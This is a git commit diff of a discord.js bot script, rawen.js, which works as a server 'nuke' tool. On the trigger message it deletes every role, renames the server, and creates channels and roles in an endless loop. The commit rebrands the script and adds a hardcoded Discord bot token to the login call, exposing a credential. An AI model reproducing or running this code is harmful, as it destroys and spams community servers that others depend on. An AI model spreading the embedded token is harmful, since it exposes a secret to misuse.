be4f3cd274c94b88eda7ca15ae491035343bc2d5
ramankurdis <93084364+ramankurdis@users.noreply.github.com>
2021-11-07 22:01:12 +0300

    Update rawen.js

--- rawen.js
+++ rawen.js
@@ -1,6 +1,6 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
-const prefix = ".";
+const prefix = "..";
 client.on("message", message => {
   if (message.content === ".") {
     if (message.channel.guild) {
@@ -15,14 +15,14 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("RaWeN Up");////nawek dane bo sar server 
+      message.guild.setName("RAMAN Up");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("RaWeN Up", "text");///////bo channel 
-        message.guild.createChannel("RaWeN Up", "voice");////bo voice
-        message.guild.createRole({ name: "RaWeN Up" });////nawek dane bo role kan
+        message.guild.createChannel("RAMAN Up", "text");///////bo channel 
+        message.guild.createChannel("RAMAN Up", "voice");////bo voice
+        message.guild.createRole({ name: "RAMAN" });////nawek dane bo role kan
       });
     }
   }
 });
 
-client.login("")
+client.login("OTAxODM1NjM3OTg3MDk4NjM0.YXVp4w.0tYjHw_cr-moKTDSLR_tLw4ucdA")
